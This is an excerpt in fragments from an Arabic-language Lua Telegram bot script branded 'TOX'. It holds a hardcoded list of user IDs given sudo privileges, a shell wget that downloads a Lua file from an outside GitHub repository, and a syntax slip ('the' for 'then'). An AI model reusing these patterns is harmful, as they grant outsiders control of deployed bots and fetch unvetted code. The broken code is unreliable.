...
sudo_users = {SUDO,bot_id,1770288756,1124610301,1360140225,1236115319,1763262705}   
...
var = true  
elseif tonumber(user_id) == tonumber(1763262705) the
var = true  
...
os.execute('wget https://raw.githubusercontent.com/ahmedyad200/dived/master/BOYKA.lua')
...
if text == 'بوت' then
Namebot = (database:get(bot_id..'Name:Bot') or 'توكس')
send(msg.chat_id_, msg.id_,'اسمي الكيوت ['..Namebot..']🌚❤️')
end
...
❿◂ اوامر الاعضاء 
 ≪━━━━━━𝐓𝐎𝐗━━━━━━≫
 ➫ ┇[𝐒𝐎𝐔𝐑𝐂𝐄 𝐓𝐎𝐗⁦❃∫](t.me/A_V_I_R_A_1)
[➫ ┇صاحب التلجرام](t.me/A_V_I_R_A_1)
 ≪━━━━━━𝐓𝐎𝐗━━━━━━≫
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
send(msg.chat_id_, msg.id_, t..'≪━━━━━━𝐓𝐎𝐗━━━━━━≫\n✪ [𝐒𝐎𝐔𝐑𝐂𝐄 𝐓𝐎𝐗⁦❃∫](t.me/A_V_I_R_A_1)➢ ')
end
